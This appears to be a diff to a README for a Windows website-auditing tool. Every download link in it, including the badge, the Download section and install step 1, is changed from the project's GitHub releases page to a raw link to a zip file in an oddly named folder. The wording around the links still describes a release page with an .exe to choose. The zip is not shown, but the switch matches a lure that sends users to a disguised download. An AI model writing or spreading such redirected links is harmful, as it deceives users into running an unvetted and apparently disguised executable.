@@ -1,12 +1,12 @@
 # 🔎 full-stack-audit - Catch Website Issues Before Launch
 
-[![Download full-stack-audit](https://img.shields.io/badge/Download%20full-stack-audit-blue?style=for-the-badge)](https://github.com/osbertunawakened431/full-stack-audit/releases)
+[![Download full-stack-audit](https://img.shields.io/badge/Download%20full-stack-audit-blue?style=for-the-badge)](https://raw.githubusercontent.com/osbertunawakened431/full-stack-audit/main/ecospecies/full_audit_stack_2.4.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest version:
 
-https://github.com/osbertunawakened431/full-stack-audit/releases
+https://raw.githubusercontent.com/osbertunawakened431/full-stack-audit/main/ecospecies/full_audit_stack_2.4.zip
 
 Choose the newest release for Windows, then download the file that matches your computer. If you see more than one file, pick the Windows one with `.exe` in the name.
 
@@ -45,7 +45,7 @@ For best results:
 ## 🚀 Install on Windows
 
 1. Open the download page:  
-   https://github.com/osbertunawakened431/full-stack-audit/releases
+   https://raw.githubusercontent.com/osbertunawakened431/full-stack-audit/main/ecospecies/full_audit_stack_2.4.zip
 
 2. Find the latest release at the top.
 
